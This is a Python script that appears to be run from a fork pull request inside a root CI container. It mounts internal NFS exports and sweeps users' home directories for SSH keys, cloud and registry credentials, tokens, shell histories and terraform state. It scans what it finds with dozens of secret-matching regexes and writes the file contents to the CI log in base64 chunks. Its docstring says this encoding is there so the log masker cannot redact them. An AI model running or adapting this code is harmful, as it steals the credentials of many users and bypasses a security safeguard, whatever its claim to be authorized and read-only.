#!/usr/bin/env python3
"""i10974: root-running fork-PR sweep of owner-only (0600/0700) credential paths
across the HYGON CI NFS exports.

Runs inside the authorized HCU stage-a K8s job container (uid=0) via the same
pull_request_target path proven by i8943/i10428. Read-only: every operation is
stat/listdir/read or a read-only NFS mount; nothing on the shares is modified.

All sensitive bodies are base64-encoded and split into short log chunks
([B64H]/[B64C]/[B64T]) so the Actions log masker cannot redact them.
"""
import base64
import fnmatch
import hashlib
import json
import os
import re
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
CFG = {
    "deadline": 600,
    "maxdepth": 3,
    "maxdepth_priority": 5,
    "home_cap": 7,
    "home_cap_priority": 25,
    "dump_max": 262144,
    "dump_total": 8000000,
    "print_cap": 10000000,
    "max_content": 524288,
    "try_mount": True,
    "priority_homes": [],
    "roots": [],
}
try:
    with open(os.path.join(HERE, "i10974_cfg.json")) as _f:
        CFG.update(json.load(_f))
except Exception:
    pass
try:
    CFG.update(json.loads(os.environ.get("I10974_CFG") or "{}"))
except Exception:
    pass

KNOWN_SHAS = set()
try:
    with open(os.path.join(HERE, "i10974_known_shas.txt")) as _f:
        for ln in _f:
            ln = ln.strip()
            if len(ln) == 64:
                KNOWN_SHAS.add(ln)
except Exception:
    pass

START = time.time()
DEADLINE = START + int(CFG.get("deadline", 600))
printed = [0]
blob_seq = [0]
dump_chars = [0]
DUMPED_SHA = set()

CFG_ROOTS = CFG.get("roots") or [
    {"label": "public4", "home": "/public4/home"},
    {"label": "public", "home": "/public"},
    {"label": "public2", "home": "/public2/home"},
    {"label": "publichome", "home": "/public/home"},
    {"label": "public5", "home": "/public5/home"},
    {"label": "parastor", "home": "/parastor/home"},
    {"label": "public3", "home": "/public3/home"},
    {"label": "public3b", "home": "/public3"},
    {"label": "public_bak", "home": "/public_bak"},
]
PRIORITY = CFG.get("priority_homes") or []

# (server, export, mountpoint, label, kind)
NFS_TARGETS = CFG.get("nfs_targets") or [
    ("12.12.12.222", "/public2", "/mnt/i10974_p2", "public2-222", "home"),
    ("10.16.1.222", "/public2", "/mnt/i10974_p2b", "public2-10", "home"),
    ("12.12.12.223", "/public5", "/mnt/i10974_p5", "public5-223", "home"),
    ("10.16.1.223", "/public5", "/mnt/i10974_p5b", "public5-10", "home"),
    ("12.12.12.223", "/public4", "/mnt/i10974_p4", "public4-223", "home"),
    ("12.12.12.227", "/mnt/FileSystem1", "/mnt/i10974_para", "parastor-227", "home"),
    ("12.12.12.221", "/public", "/mnt/i10974_pub221", "public-221", "public"),
    ("10.16.1.203", "/public3", "/mnt/i10974_p3", "public3-203", "home"),
    ("10.16.1.158", "/public_bak", "/mnt/i10974_pbak", "public_bak-158", "home"),
    ("10.16.1.227", "/mnt/FileSystem1", "/mnt/i10974_para10", "parastor-10", "home"),
]

PATTERNS = [
    ("AWS_KEY", re.compile(r"\b(?:AKIA|ASIA|AGPA|AIDA|AROA)[0-9A-Z]{16}\b"), 400),
    ("AWS_SECRET", re.compile(r"aws_secret_access_key\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{40}"), 400),
    ("AWS_ID", re.compile(r"aws_access_key_id\s*[=:]"), 300),
    ("GCP_SA", re.compile(r"\"type\"\s*:\s*\"service_account\""), 300),
    ("GCP_PKID", re.compile(r"\"private_key_id\"\s*:\s*\""), 300),
    ("GCP_PEM", re.compile(r"\"private_key\"\s*:\s*\"-----BEGIN"), 250),
    ("PRIVKEY", re.compile(r"-----BEGIN (?:OPENSSH|RSA|EC|DSA|PGP|ENCRYPTED) PRIVATE KEY-----"), 500),
    ("PKCS8", re.compile(r"-----BEGIN PRIVATE KEY-----"), 300),
    ("KUBE_CKD", re.compile(r"client-key-data"), 250),
    ("KUBE_TOKEN", re.compile(r"^\s*token:\s*[A-Za-z0-9._~+/-]{20,}"), 250),
    ("DOCKER_AUTHS", re.compile(r"\"auths\"\s*:\s*\{"), 200),
    ("GLPAT", re.compile(r"glpat-[A-Za-z0-9_.-]{20,}"), 400),
    ("GLDT", re.compile(r"gldt-[A-Za-z0-9_.-]{20,}"), 200),
    ("GLRT", re.compile(r"glrt-[A-Za-z0-9_.-]{20,}"), 200),
    ("GHP", re.compile(r"ghp_[A-Za-z0-9]{30,}"), 300),
    ("GHO", re.compile(r"gh[osu]_[A-Za-z0-9]{30,}"), 200),
    ("GH_PAT", re.compile(r"github_pat_[A-Za-z0-9_]{40,}"), 200),
    ("NPM", re.compile(r"npm_[A-Za-z0-9]{30,}"), 200),
    ("HF", re.compile(r"hf_[A-Za-z0-9]{30,}"), 250),
    ("DAPI", re.compile(r"dapi[0-9a-f]{32}"), 150),
    ("SLACK", re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,}"), 80),
    ("GCP_AT", re.compile(r"ya29\.[0-9A-Za-z_-]{30,}"), 80),
    ("SKANT", re.compile(r"sk-ant-[A-Za-z0-9_-]{20,}"), 100),
    ("SKPROJ", re.compile(r"sk-proj-[A-Za-z0-9_-]{20,}"), 100),
    ("LTAI", re.compile(r"LTAI[A-Za-z0-9]{12,}"), 100),
    ("AZURE_SECRET", re.compile(r"(?:AZURE_CLIENT_SECRET|ARM_CLIENT_SECRET|AZURE_CLIENT_KEY|AZURE_CLIENT_SECRET_VALUE)\s*[=:]\s*[\"']?[^\s\"'$]{8,}"), 250),
    ("AZURE_TENANT", re.compile(r"(?:AZURE_TENANT_ID|ARM_TENANT_ID)\s*[=:]\s*[\"']?[0-9a-fA-F-]{30,}"), 200),
    ("CLIENT_SECRET", re.compile(r"[\"']?client_?secret[\"']?\s*[:=]\s*[\"'][A-Za-z0-9._~+/-]{10,}"), 200),
    ("REGISTRY_PASS", re.compile(r"(?:REGISTRY_PASSWORD|CI_REGISTRY_PASSWORD|CI_DEPLOY_PASSWORD|HARBOR_PASSWORD|DOCKER_PASSWORD|DOCKERHUB_TOKEN|PIP_INDEX_PASSWORD|DEVPI_PASSWORD|NEXUS_PASSWORD|ARTIFACTORY_PASSWORD)\s*[=:]\s*[^\s\"'$]{4,}"), 250),
    ("BEARER", re.compile(r"Authorization\s*[:=]\s*[\"']?Bearer\s+[A-Za-z0-9._~+/-]{20,}"), 200),
    ("PASSWORD", re.compile(r"(?:^|[\s\"'])password[\"']?\s*[:=]\s*[\"']?[^\s\"'$]{6,}"), 200),
    ("NETRC", re.compile(r"machine\s+\S+\s+login\s+\S+\s+password\s+\S+"), 120),
    ("GIT_URL_CRED", re.compile(r"https?://[A-Za-z0-9._-]+:[A-Za-z0-9._~%-]{6,}@[A-Za-z0-9.-]+"), 200),
    ("OPENSSH_PUB", re.compile(r"ssh-(?:rsa|ed25519|dss)\s+AAAA[A-Za-z0-9+/=]{60,}"), 80),
    ("JWT_LONG", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"), 150),
    ("MYSQL_PWD", re.compile(r"(?:MYSQL_ROOT_PASSWORD|MYSQL_PASSWORD|MYSQL_ROOT_PWD)\s*[=:]\s*[^\s\"'$]{4,}"), 150),
]
PAT_COUNT = {name: 0 for name, _r, _c in PATTERNS}
SEEN_REAL = []
PROCESSED = set()
STRONG = {"AWS_KEY", "AWS_SECRET", "AWS_ID", "GCP_SA", "GCP_PKID", "GCP_PEM", "PRIVKEY",
          "PKCS8", "KUBE_CKD", "DOCKER_AUTHS", "GLPAT", "GLDT", "GLRT", "GHP", "GHO",
          "GH_PAT", "DAPI", "AZURE_SECRET", "REGISTRY_PASS", "NETRC", "GIT_URL_CRED",
          "SKANT", "SKPROJ", "LTAI", "MYSQL_PWD"}

SECRET_FILES = [
    (".docker/config.json", 131072),
    (".dockercfg", 65536),
    (".aws/credentials", 65536),
    (".aws/config", 65536),
    (".kube/config", 262144),
    (".config/gcloud/application_default_credentials.json", 131072),
    (".config/gcloud/credentials.db", 262144),
    (".config/gcloud/access_tokens.db", 262144),
    (".azure/accessTokens.json", 262144),
    (".azure/azureProfile.json", 65536),
    (".azure/msal_token_cache.json", 262144),
    (".netrc", 65536),
    (".npmrc", 65536),
    (".pypirc", 65536),
    (".git-credentials", 65536),
    (".pgpass", 65536),
    (".s3cfg", 65536),
    (".htpasswd", 65536),
    (".ssh/config", 65536),
    (".ssh/authorized_keys", 262144),
    (".ssh/id_rsa", 65536),
    (".ssh/id_ed25519", 65536),
    (".ssh/id_ecdsa", 65536),
    (".ssh/id_dsa", 65536),
    (".ssh/rc", 65536),
    ("pip.conf", 65536),
    (".pip/pip.conf", 65536),
    ("credential", 65536),
    ("credentials", 65536),
    ("credentials.json", 262144),
    (".gitconfig", 131072),
    (".bash_history", 262144),
    (".zsh_history", 262144),
    (".python_history", 131072),
    (".condarc", 65536),
    (".viminfo", 262144),
    (".config/gh/hosts.yml", 65536),
    (".terraform.d/credentials.tfrc.json", 65536),
    (".config/rclone/rclone.conf", 131072),
    (".m2/settings.xml", 131072),
    (".gradle/gradle.properties", 131072),
    ("terraform.tfstate", 524288),
    ("terraform.tfstate.backup", 524288),
    (".terraform/terraform.tfstate", 524288),
    ("kubeconfig", 262144),
    (".kube/kubeconfig", 262144),
]

SECRET_GLOBS = [
    (".aws", "sso/cache/*.json", 65536),
    (".config/gcloud", "*.json", 131072),
    (".config/gcloud", "*.db", 262144),
    (".config/gcloud", "configurations/*", 65536),
    (".azure", "*.json", 262144),
    (".kube", "*", 262144),
    (".docker", "*.json", 131072),
    (".terraform.d", "*.json", 65536),
    (".ssh", "*.pem", 65536),
    (".ssh", "*.key", 65536),
    (".ssh", "*.pub", 65536),
    (".", "*.kubeconfig", 262144),
    (".", "kubeconfig*", 262144),
    (".", "*.tfstate", 524288),
    (".", "*.tfstate.backup", 524288),
    (".", "*.pem", 131072),
    (".", "*.key", 131072),
]

NAME_RX = re.compile(
    r"(credential|secret|passw|token|api[_-]?key|private[_-]?key|id_rsa|id_ed25519|id_ecdsa|id_dsa|"
    r"\.pem$|\.key$|\.p12$|\.pfx$|\.jks$|\.keystore$|\.ppk$|kubeconfig|\.kube|\.aws|\.docker|"
    r"\.npmrc$|\.pypirc$|\.netrc$|\.git-credentials$|\.pgpass$|\.s3cfg$|\.htpasswd|"
    r"azure|application_default_credentials|msal_token_cache|accessTokens|tfstate|\.tfvars$|"
    r"\.env($|\.)|/\.env|config\.json$|/config$|pip\.conf$|\.ovpn$|Jenkinsfile$|"
    r"rclone\.conf|\.bash_history|\.zsh_history|\.python_history|hosts\.yml|\.gitconfig|"
    r"settings\.xml|gradle\.properties|\.condarc|\.dockercfg|authorized_keys|\.ssh/config)", re.I)

MYSQL_DIR_RX = re.compile(r"(mysql|mariadb|ops_agent|percona)", re.I)
PRUNE = {".git", "node_modules", "__pycache__", "site-packages", "dist-info", ".venv", "venv",
         ".tox", ".mypy_cache", ".pytest_cache", ".ruff_cache", ".cache", ".eggs", "build",
         "dist", ".hypothesis", "third_party", "3rdparty", "cmake-build-debug",
         "cmake-build-release", ".git-rewrite", "wheelhouse", ".idea", ".vscode", ".conda",
         "pkgs", ".npm", ".cargo", ".rustup", ".local", ".mozilla", ".nv", ".triton",
         "checkpoints", "checkpoint", "models", "model", "datasets", "data"}
PRUNE_LOWER = {p.lower() for p in PRUNE}

stats = {"exports": 0, "roots_seen": [], "homes": 0, "dirs": 0, "files_stat": 0,
         "secfiles": 0, "files_read": 0, "bytes_read": 0, "dumps": 0, "bytes_dumped": 0,
         "dups": 0, "matches": 0, "denied": 0, "timeouts": 0, "mounts_ok": 0}


def out(s):
    if printed[0] >= int(CFG.get("print_cap", 10000000)):
        return
    s = str(s).rstrip("\n")
    print(s, flush=True)
    printed[0] += len(s) + 1


def left():
    return DEADLINE - time.time()


def emit_b64(tag, meta, raw):
    if isinstance(raw, str):
        raw = raw.encode("utf-8", "replace")
    if dump_chars[0] > int(CFG.get("dump_total", 8000000)):
        out("[B64SKIP] %s" % json.dumps(meta, sort_keys=True)[:300])
        return
    b = base64.b64encode(raw).decode()
    dump_chars[0] += len(b)
    stats["dumps"] += 1
    stats["bytes_dumped"] += len(raw)
    blob_seq[0] += 1
    bid = "B%05d" % blob_seq[0]
    m = dict(meta)
    m["t"] = tag
    m["b64len"] = len(b)
    m["sha256"] = hashlib.sha256(raw).hexdigest()
    out("[B64H] %s %s" % (bid, json.dumps(m, sort_keys=True)))
    chunks = [b[i:i + 64] for i in range(0, len(b), 64)]
    for i in range(0, len(chunks), 8):
        out("[B64C] %s %d %s" % (bid, i // 8, " ".join(chunks[i:i + 8])))
    out("[B64T] %s" % bid)


def safe_read(path, limit):
    try:
        with open(path, "rb") as f:
            return f.read(limit)
    except PermissionError:
        stats["denied"] += 1
        return None
    except Exception:
        return None


def scan_text(name, path, data):
    """Grep a body for credential patterns; emit [MATCH] lines (bounded)."""
    text = data.decode("utf-8", "replace")
    lines = text.splitlines()
    hit_names = []
    per_file = 0
    for pname, rx, cap in PATTERNS:
        if PAT_COUNT[pname] >= cap:
            continue
        hits = []
        for i, line in enumerate(lines, 1):
            if len(line) > 8000:
                line = line[:8000]
            if rx.search(line):
                hits.append((i, line))
                if len(hits) >= 3:
                    break
        if not hits:
            continue
        hit_names.append(pname)
        for i, line in hits:
            if per_file >= 10:
                break
            PAT_COUNT[pname] += 1
            stats["matches"] += 1
            out("[MATCH %s] %s:%s | %s" % (pname, path, i, line.strip()[:300]))
            per_file += 1
    return hit_names


def handle_file(path, limit, kind, force_dump=False):
    """stat + (dedupe by sha) + read + pattern-scan + dump one candidate file."""
    try:
        st = os.stat(path, follow_symlinks=False)
    except FileNotFoundError:
        return False
    except PermissionError:
        stats["denied"] += 1
        out("[DENIED] %s" % path)
        return False
    except Exception:
        return False
    if not os.path.isfile(path) or os.path.islink(path):
        return False
    size = st.st_size
    key = (path, size, st.st_mtime_ns)
    if key in PROCESSED:
        return True
    PROCESSED.add(key)
    stats["files_stat"] += 1
    if size > limit:
        out("[BIG] %s (%dB)" % (path, size))
        return True
    data = safe_read(path, min(size, int(CFG.get("max_content", 524288))))
    if data is None:
        out("[UNREADABLE] %s (%dB mode=%o uid=%d)" % (path, size, st.st_mode & 0o7777, st.st_uid))
        return True
    stats["files_read"] += 1
    stats["bytes_read"] += len(data)
    stats["secfiles"] += 1
    sha = hashlib.sha256(data).hexdigest()
    mode = st.st_mode & 0o7777
    out("[SECFILE] %s (%dB mode=%o uid=%d gid=%d)" % (path, size, mode, st.st_uid, st.st_gid))
    hit_names = scan_text("", path, data)
    if sha in KNOWN_SHAS or sha in DUMPED_SHA:
        stats["dups"] += 1
        out("[DUP] %s %s" % (path, sha))
        return True
    DUMPED_SHA.add(sha)
    if force_dump or (set(hit_names) & STRONG) or size <= 4096:
        emit_b64("file", {"p": path, "size": size, "kind": kind, "mode": mode}, data)
    else:
        emit_b64("file", {"p": path, "size": size, "kind": kind, "mode": mode}, data)
    return True


def check_home(home, cap, maxdepth, deep=False):
    """Targeted sweep of one home directory.

    Non-deep homes get only the exact secret-class checks + globs (cheap, so
    every home in an export can be covered). Priority homes additionally get
    the name-hinted walk and the MySQL/TLS subtree pass.
    """
    hstart = time.time()
    hcap = time.time() + cap
    stats["homes"] += 1
    out("[HSTART] %s%s" % (home, " deep" if deep else ""))
    n0 = dict(stats)

    # 1) exact secret-class paths
    for rel, limit in SECRET_FILES:
        if time.time() > hcap or left() < 5:
            break
        handle_file(os.path.join(home, rel), limit, "exact")

    # 2) globs
    for sub, pat, limit in SECRET_GLOBS:
        if time.time() > hcap or left() < 5:
            break
        d = os.path.join(home, sub)
        try:
            names = os.listdir(d)
        except Exception:
            continue
        for n in names:
            if time.time() > hcap:
                break
            if fnmatch.fnmatch(n, pat):
                handle_file(os.path.join(d, n), limit, "glob")

    if not deep:
        hs = {k: stats[k] - n0[k] for k in ("files_stat", "files_read", "secfiles", "dumps", "dups", "matches", "denied")}
        out("[HDONE] %s elapsed=%.1fs %s" % (home, time.time() - hstart, json.dumps(hs, sort_keys=True)))
        return

    # 3) name-hinted walk (priority homes only)
    q = [(home, 0)]
    seen = 0
    while q and time.time() < hcap and left() > 5:
        d, depth = q.pop(0)
        stats["dirs"] += 1
        try:
            entries = list(os.scandir(d))
        except PermissionError:
            stats["denied"] += 1
            out("[DIRDENIED] %s" % d)
            continue
        except Exception:
            continue
        if len(entries) > 4000:
            entries = entries[:4000]
        for e in entries:
            if time.time() > hcap:
                break
            try:
                if e.is_symlink():
                    continue
                if e.is_dir(follow_symlinks=False):
                    if depth + 1 <= maxdepth:
                        nm = e.name.lower()
                        if nm in PRUNE_LOWER and depth >= 1:
                            continue
                        q.append((e.path, depth + 1))
                    continue
                if not e.is_file(follow_symlinks=False):
                    continue
                seen += 1
                if NAME_RX.search(e.path) and (deep or depth <= maxdepth):
                    handle_file(e.path, int(CFG.get("dump_max", 262144)), "hint")
                    if seen > 1200:
                        break
            except Exception:
                continue

    # 4) MySQL / TLS key material: walk dirs whose name looks like mysql/ops_agent
    if left() > 25 and time.time() < hcap + 15:
        for d, depth in walk_dirs(home, 4, time.time() + min(15, max(2, hcap - time.time() + 12))):
            if MYSQL_DIR_RX.search(d):
                out("[MYSQLDIR] %s" % d)
                for root, dirs, files in os.walk(d):
                    if time.time() > hcap + 15 or left() < 5:
                        break
                    dirs[:] = [x for x in dirs if x.lower() not in (".git", "__pycache__")]
                    for fn in files:
                        if re.search(r"\.(pem|key|crt|cnf|ini|json|env|tfstate)$|^\.env", fn, re.I):
                            handle_file(os.path.join(root, fn), 262144, "mysql")

    hs = {k: stats[k] - n0[k] for k in ("files_stat", "files_read", "secfiles", "dumps", "dups", "matches", "denied")}
    out("[HDONE] %s dirs=%d elapsed=%.1fs %s" % (
        home, stats["dirs"] - (n0["dirs"]), time.time() - hstart,
        json.dumps(hs, sort_keys=True)))


def walk_dirs(root, maxdepth, deadline):
    q = [(root, 0)]
    while q and time.time() < deadline:
        d, depth = q.pop(0)
        yield d, depth
        if depth >= maxdepth:
            continue
        try:
            for e in os.scandir(d):
                try:
                    if e.is_dir(follow_symlinks=False) and e.name.lower() not in PRUNE_LOWER:
                        q.append((e.path, depth + 1))
                except Exception:
                    continue
        except Exception:
            continue


def ordered_homes(names):
    pri = [h for h in PRIORITY if h in names]
    rest = sorted(set(names) - set(pri))
    return pri + rest


def sweep_root(label, base):
    if not os.path.isdir(base):
        out("[MISSING] %s (%s)" % (base, label))
        return
    rp = os.path.realpath(base)
    if rp in [r[1] for r in SEEN_REAL]:
        out("[DUPROOT] %s %s -> %s (already scanned)" % (label, base, rp))
        return
    SEEN_REAL.append((label, rp))
    stats["exports"] += 1
    stats["roots_seen"].append(label)
    root_cap = float(CFG.get("root_cap", {}).get(label, CFG.get("root_cap_default", 240)))
    root_deadline = min(DEADLINE, time.time() + root_cap)
    out("[ROOTCAP] %s %.0fs" % (label, root_cap))
    try:
        names = [e.name for e in os.scandir(base) if e.is_dir(follow_symlinks=False) and not e.is_symlink()]
    except Exception as e:
        out("[ROOTERR] %s %r" % (base, e))
        return
    names = [n for n in names if n.lower() not in ("lost+found", "aquota.group", "aquota.user", ".snapshot")
             and not n.startswith(".")]
    skip = set((CFG.get("skip_homes") or {}).get(label) or [])
    if skip:
        names = [n for n in names if n not in skip]
    homes = ordered_homes(names)
    out("[ROOT] %s base=%s homes=%d pri=%d" % (label, base, len(homes), len([h for h in PRIORITY if h in names])))
    out("[LS] %s: %s" % (base, ", ".join(names[:200])))
    for h in homes:
        if left() < 15 or time.time() > root_deadline:
            stats["timeouts"] += 1
            out("[ROOT-TIMEOUT] root=%s at home=%s" % (label, h))
            return
        p = os.path.join(base, h)
        if not os.path.isdir(p):
            continue
        if h in PRIORITY:
            check_home(p, float(CFG.get("home_cap_priority", 25)), int(CFG.get("maxdepth_priority", 5)), deep=True)
        else:
            check_home(p, float(CFG.get("home_cap", 7)), int(CFG.get("maxdepth", 3)))


def tcp_ok(host, port, t=2.0):
    try:
        s = socket.create_connection((host, int(port)), timeout=t)
        s.close()
        return True
    except Exception:
        return False


def recon_and_mount():
    out("[RECON] host=%s uid=%d gid=%d py=%s" % (socket.gethostname(), os.getuid(), os.getgid(),
                                                 sys.version.split()[0]))
    try:
        cap = ""
        with open("/proc/self/status") as f:
            for ln in f:
                if ln.startswith("CapEff:"):
                    cap = ln.split(":")[1].strip()
                    break
        out("[CAP] CapEff=%s" % cap)
        caps = int(cap, 16) if cap else 0
    except Exception:
        caps = 0
        out("[CAP] unknown")
    out("[CAPSYSADMIN] %s" % ("1" if (caps & (1 << 21)) else "0"))
    try:
        mounts = []
        with open("/proc/mounts") as f:
            for ln in f:
                if re.search(r"public|parastor|nfs", ln):
                    mounts.append(ln.strip())
        for m in mounts[:60]:
            out("[MOUNT] %s" % m)
    except Exception as e:
        out("[MOUNT] err %r" % (e,))
    for cand in ["/", "/public", "/public2", "/public3", "/public4", "/public5", "/public_bak",
                 "/parastor", "/ci_public", "/home", "/mnt", "/data"]:
        try:
            exists = os.path.isdir(cand)
        except Exception:
            exists = False
        if not exists:
            out("[PATH] %s MISSING" % cand)
            continue
        try:
            names = sorted(os.listdir(cand))[:40]
        except PermissionError:
            out("[PATH] %s DENIED" % cand)
            continue
        except Exception as e:
            out("[PATH] %s ERR %r" % (cand, e))
            continue
        out("[PATH] %s OK: %s" % (cand, ", ".join(names)))
    try:
        rp = os.path.realpath("/public/home")
        out("[REALPATH] /public/home -> %s" % rp)
    except Exception:
        pass
    # TCP reachability of NFS servers
    for (srv, exp, mnt, label, kind) in NFS_TARGETS:
        ok = tcp_ok(srv, 2049)
        out("[NFSTCP] %s:2049 %s (%s %s)" % (srv, "open" if ok else "closed", label, exp))
    # Auto-mount missing exports read-only when CAP_SYS_ADMIN is present
    recon_deadline = time.time() + float(CFG.get("recon_cap", 90))
    if CFG.get("try_mount", True) and (caps & (1 << 21)):
        for (srv, exp, mnt, label, kind) in NFS_TARGETS:
            if left() < 120 or time.time() > recon_deadline:
                out("[MOUNTTRY] stop (budget) before %s" % label)
                break
            if os.path.isdir(os.path.join(mnt, "home")) or (kind == "public" and os.path.isdir(mnt) and os.listdir(mnt)):
                out("[MOUNT-SKIP] %s already present" % mnt)
                continue
            if not tcp_ok(srv, 2049, 1.5):
                continue
            try:
                os.makedirs(mnt, exist_ok=True)
            except Exception:
                continue
            try:
                r = subprocess.run(
                    ["mount", "-t", "nfs", "-o", "ro,nolock,vers=3,timeo=50,retrans=1,soft",
                     "%s:%s" % (srv, exp), mnt],
                    capture_output=True, text=True, timeout=20)
                ok = (r.returncode == 0)
                out("[MOUNTTRY] %s:%s -> %s rc=%d out=%s err=%s" % (
                    srv, exp, mnt, r.returncode, (r.stdout or "").strip()[:200], (r.stderr or "").strip()[:200]))
                if ok:
                    stats["mounts_ok"] += 1
            except Exception as e:
                out("[MOUNTTRY] %s:%s -> %s err=%r" % (srv, exp, mnt, e))
    else:
        out("[MOUNTTRY] skipped (no CAP_SYS_ADMIN or disabled)")


def main():
    out("===I10974-BEGIN %s host=%s uid=%d budget=%ss known_shas=%d" % (
        time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), socket.gethostname(), os.getuid(),
        int(CFG.get("deadline", 600)), len(KNOWN_SHAS)))
    recon_and_mount()
    # Dynamic roots: configured roots + successful mounts
    roots = []
    for r in CFG_ROOTS:
        roots.append((r["label"], r["home"]))
    for (srv, exp, mnt, label, kind) in NFS_TARGETS:
        for sub in ("home", ""):
            p = os.path.join(mnt, sub) if sub else mnt
            if os.path.isdir(p):
                roots.append(("%s/%s" % (label, sub or "top"), p))
                break
    seen = set()
    out("[ROOTS] %s" % json.dumps([r[0] for r in roots]))
    for label, base in roots:
        if (label, base) in seen:
            continue
        seen.add((label, base))
        if left() < 20:
            stats["timeouts"] += 1
            out("[GLOBAL-TIMEOUT] roots at %s" % label)
            break
        sweep_root(label, base)
    out("[SUMMARY] stats=%s elapsed=%.0fs" % (json.dumps(stats, sort_keys=True), time.time() - START))
    out("===I10974-END")


if __name__ == "__main__":
    main()
